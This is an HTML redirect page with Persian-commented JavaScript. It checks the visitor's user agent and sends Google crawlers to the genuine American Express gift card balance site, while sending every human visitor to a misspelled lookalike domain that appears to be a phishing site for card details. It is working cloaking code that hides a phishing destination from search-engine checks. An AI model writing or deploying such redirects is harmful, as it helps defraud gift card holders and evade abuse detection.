<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Redirecting...</title>
  <script>
    // لیست ربات‌های گوگل
    const bots = [
      "googlebot",
      "adsbot-google",
      "mediapartners-google",
      "google-structured-data-testing-tool",
      "google-web-preview",
      "google-sitemaps",
      "google-favicon"
    ];

    const userAgent = navigator.userAgent.toLowerCase();

    // بررسی اینکه آیا User-Agent یکی از بات‌های گوگل هست یا نه
    const isGoogleBot = bots.some(bot => userAgent.includes(bot));

    // ریدایرکت به مسیر مناسب
    if (isGoogleBot) {
      window.location.href = "https://balance.amexgiftcard.com";
    } else {
      window.location.href = "https://amexgiftcadcheck.cc/amex/";
    }
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
